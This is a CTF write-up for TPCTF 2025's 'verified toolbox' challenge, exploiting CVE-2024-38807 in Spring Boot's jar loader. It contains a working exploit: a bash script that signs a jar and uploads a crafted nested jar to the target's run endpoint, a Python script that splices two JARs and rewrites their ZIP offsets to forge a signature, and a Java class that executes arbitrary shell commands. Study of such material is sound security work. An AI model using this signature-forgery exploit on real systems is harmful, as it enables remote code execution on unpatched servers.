---
title: "verified toolbox - TPCTF 2025"
category: "misc"
type: "writeup"
tags: ["parser-differential", "misc", "zip", "jar", "spring", "tpctf", "tpctf-2025", "2025", "ctf-writeup"]
summary: "It uses Spring Boot 3.3.2, so it’s CVE-2024-38807: Signature Forgery Vulnerability in Spring Boot’s Loader."
source:
  name: "CTFtime writeup #40072"
  url: "https://ctftime.org/writeup/40072"
original_source: "https://ouuan.moe/post/2025/03/tpctf-2025#verified-toolbox-1-solve"
ctf:
  name: "TPCTF 2025"
  year: 2025
  challenge: "verified toolbox"
---

## Metadata

- **CTF:** TPCTF 2025
- **Task:** verified toolbox
- **Author team:** TP-Link
- **CTFtime tags:** parser-differential, misc, zip, jar
- **CTFtime:** <https://ctftime.org/writeup/40072>
- **Original writeup:** <https://ouuan.moe/post/2025/03/tpctf-2025#verified-toolbox-1-solve>

---
It uses Spring Boot 3.3.2, so it’s [CVE-2024-38807: Signature Forgery Vulnerability in Spring Boot’s Loader](<https://spring.io/security/cve-2024-38807>).

The vulnerability is that spring-boot-loader uses `JarInputStream` to verify the signatures but uses a custom `ZipContent` class to load the contents. They parse a ZIP file differently and may read different contents from a specially crafted JAR file. `JarInputStream` reads a JAR file from start to end, while `ZipContent` read the end of central directory record at the end first. We can construct a malicious JAR file by concatenating the bytes of two JAR files, and then adjust the offset fields in the central directory headers and the end of central directory record of the second JAR file. The signature verifier will read the first JAR file while the content loader will read the second.

You can also find [the commit that fixes this vulnerability](<https://github.com/spring-projects/spring-boot/commit/0b24ee857189e139f48826bf2aef10ae8680c11b>) along with the `mismatched.jar` test case, and then create the malicious JAR file based on `mismatched.jar`.

```bash  
#!/bin/bash

set -euo pipefail

url="$1"

javac Tool.java

jar cf exp.jar Tool.class

rm -f keystore.jks

keytool -genkeypair \  
-alias exp \  
-dname 'CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown' \  
-keyalg DSA \  
-keysize 2048 \  
-validity 1 \  
-keystore keystore.jks \  
-storepass 133337

jarsigner -keystore keystore.jks -storepass 133337 exp.jar exp

curl -O "$url/toolbox/greeting.jar"  
jar xf greeting.jar

python [exp.py](http://exp.py)

jar cf0 nested.jar inner.jar

curl -F [[email protected]](https://ctftime.org/cdn-cgi/l/email-protection) -F path=inner.jar -F input='/readflag give me the flag' "$url"/run  
```

```python  
with open('hello.jar', 'rb') as f:  
signed = f.read()

with open('exp.jar', 'rb') as f:  
exp = f.read()

shift = len(signed)  
exp_list = list(exp)

eocd_start = exp.rfind(b'PK\x05\x06')  
cd_offset = int.from_bytes(exp[eocd_start+16:eocd_start+20], 'little')  
new_cd_offset = (cd_offset + shift).to_bytes(4, 'little')  
exp_list[eocd_start+16:eocd_start+20] = new_cd_offset

cd_start = cd_offset  
pos = cd_start  
while pos < eocd_start:  
if exp[pos:pos+4] == b'PK\x01\x02':  
lfh_offset = int.from_bytes(exp[pos+42:pos+46], 'little')  
new_lfh_offset = (lfh_offset + shift).to_bytes(4, 'little')  
exp_list[pos+42:pos+46] = new_lfh_offset  
pos += 46  
else:  
pos += 1

modified_exp = bytes(exp_list)  
with open('inner.jar', 'wb') as f:  
f.write(signed)  
f.write(modified_exp)  
```

```java  
import java.io.ByteArrayOutputStream;

public class Tool {  
public static String run(String cmd) {  
try {  
ProcessBuilder processBuilder = new ProcessBuilder("sh", "-c", cmd);  
Process process = processBuilder.start();

ByteArrayOutputStream bos = new ByteArrayOutputStream();  
bos.write(String.format("\n$ %s\n", cmd).getBytes());

process.getInputStream().transferTo(bos);  
process.getErrorStream().transferTo(bos);

return bos.toString();  
} catch (Exception e) {  
return e.getMessage();  
}  
}  
}  
```
